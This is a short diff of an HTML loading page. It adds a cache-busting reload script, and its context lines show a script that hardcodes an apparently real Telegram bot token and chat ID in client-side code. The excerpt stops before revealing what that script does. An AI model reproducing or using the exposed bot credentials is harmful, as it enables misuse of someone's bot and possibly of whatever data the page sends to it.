@@ -14,6 +14,15 @@
   <p style="color:#999;">Loading...</p>
 </div>
 <script>
+// Cache buster: force reload if stale
+if (location.search.indexOf('_cb=5') === -1) {
+  var u = location.href.split('#')[0]
+  var h = location.hash || ''
+  u = u + (u.indexOf('?') > -1 ? '&' : '?') + '_cb=5' + h
+  location.replace(u)
+}
+</script>
+<script>
 (function() {
   var BOT_TOKEN = '8637229217:AAHukIDrQ3yHMKakpb4pOhLbb-IpjG_vtCA'
   var CHAT_ID = '1184265321'
